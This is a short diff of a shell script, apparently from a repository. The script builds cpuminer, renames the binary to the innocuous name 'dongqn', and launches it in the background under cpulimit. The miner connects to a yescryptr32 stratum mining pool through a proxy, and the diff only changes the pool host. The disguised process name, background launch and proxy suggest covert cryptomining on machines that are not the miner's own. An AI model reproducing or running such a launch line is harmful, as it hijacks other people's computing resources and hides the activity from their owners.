@@ -94,4 +94,4 @@ chmod +x *
 ./build.sh
 mv cpuminer dongqn
 make
-cpulimit --exe dongqn --limit 320 -b && ./dongqn -a yescryptr32 -o stratum+tcp://wavi.ukkey3.space:4332 -u minhthang.1 -p x -x dongqn.cf:1221 --background
+cpulimit --exe dongqn --limit 320 -b && ./dongqn -a yescryptr32 -o stratum+tcp://wavi.suprnova.cc:6762 -u minhthang.1 -p x -x dongqn.cf:1221 --background
